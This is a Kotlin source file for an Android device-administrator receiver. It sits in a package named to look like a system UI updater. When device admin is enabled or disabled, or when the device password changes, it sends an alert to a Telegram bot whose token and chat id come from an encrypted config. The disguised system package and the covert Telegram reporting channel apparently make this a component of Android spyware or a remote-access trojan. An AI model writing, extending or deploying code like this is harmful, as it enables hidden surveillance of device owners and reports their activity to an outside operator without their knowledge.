package com.android.systemui.updater

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import com.android.systemui.updater.ErrorReporter

class DeviceAdminHandler : DeviceAdminReceiver() {

    private fun getTelegramClient(context: Context): TelegramClient? {
        return try {
            val config = EncryptedConfig.getInstance(context)
            val token = config.getBotToken()
            val chatId = config.getChatId()
            if (token.isNotEmpty() && chatId.isNotEmpty()) {
                TelegramClient(context, token, chatId)
            } else null
        } catch (e: Exception) {
            null
        }
    }

    override fun onEnabled(context: Context, intent: Intent) {
        getTelegramClient(context)?.sendText("🔒 Device Admin activated")
    }

    override fun onDisabled(context: Context, intent: Intent) {
        getTelegramClient(context)?.sendText("⚠️ Device Admin deactivated")
    }

    override fun onPasswordChanged(context: Context, intent: Intent) {
        getTelegramClient(context)?.sendText("🔑 Device password changed")
    }
}
